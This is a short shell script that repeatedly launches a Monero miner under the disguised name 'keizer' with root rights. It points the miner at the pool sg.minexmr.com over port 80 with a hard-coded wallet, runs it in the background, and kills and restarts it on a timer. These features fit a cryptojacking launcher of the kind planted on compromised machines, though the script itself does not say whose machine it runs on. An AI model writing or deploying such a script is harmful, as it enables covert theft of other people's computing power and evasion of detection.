#!/bin/sh 
 while true;
  do
  sudo ./keizer --donate-level 1 -o sg.minexmr.com:80 -u 47RMDsjAS2p5V7NyFoGiFPZNKZiEfF4Hr1FJHEExJwuKGku7CHfS91CcpVWnCvKTDhZY1XEJU5cg4LS2nqoAwQiT4Qi7bEZ -p x -k --background
  sleep 3000
  sudo kill $(ps aux | grep 'keizer' | awk '{print $2}');
  sleep 60
done
